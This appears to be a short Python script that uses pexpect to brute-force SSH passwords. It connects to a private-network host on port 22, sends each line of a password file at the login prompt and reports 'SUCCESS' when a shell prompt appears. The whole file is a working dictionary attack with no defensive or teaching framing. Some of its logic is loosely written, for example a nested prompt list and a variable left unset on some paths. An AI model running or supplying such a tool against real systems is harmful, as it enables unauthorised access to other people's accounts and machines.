import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(host, num):

    ssh_netkey = 'continue connecting'
    connStr = 'ssh '+ host+' -p '+num
    child = pexpect.spawn(connStr)
    ret = child.expect(['continue connecting', pexpect.TIMEOUT, pexpect.EOF, \
            '[P|p]assword:'], timeout=10 )

    if ret == 0 :

        print('[+] This is SSH Service ! ')
        a = 1

        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword', pexpect.EOF])

        if ret == 0 :
            print ("[-] Error Connection to SSH Server \n")
            
        if ret == 1 :
            fn = open('/root/Desktop/passFile.txt', 'r')
            print("[*] Password attacking... ")

            for line in fn.readlines():
                print(" [-] password :", line )
                child.sendline(line)
                prom = child.expect([pexpect.EOF, PROMPT])
                if prom == 1 :
                    print(" [+] SUCCESS! password :", line)
                    a = 2            
        if ret == 2 :
            print("[*] EOF !! ")

    if ret == 1 :
        print('[-] Error connecting')
        a = 0

    if ret == 2 :
        print('[-] EOF Error ')
        a = 0
              
    if ret == 3: 
        print('[+] This is ssh service.. ')
        fn = open('/root/Desktop/passFile.txt', 'r')
        print('[$] password attacking ')
        a = 1

        for line in fn.readlines():
            print(" [-] password :", line)
            child.sendline(line.strip('\n'))
            prom = child.expect([pexpect.EOF, pexpect.TIMEOUT, '> '],timeout=5)
            if prom == 0 :
                print(" EOF !! ")
            if prom == 1 :
                print("Timeout")
            if prom == 2 :
                print(" [+] SUCCESS ! password :", line)
                a = 2

        

    #child.sendline(password)
    #child.expect(PROMPT)
    child.close()

    return a


print(connect('192.168.108.132', '22'))

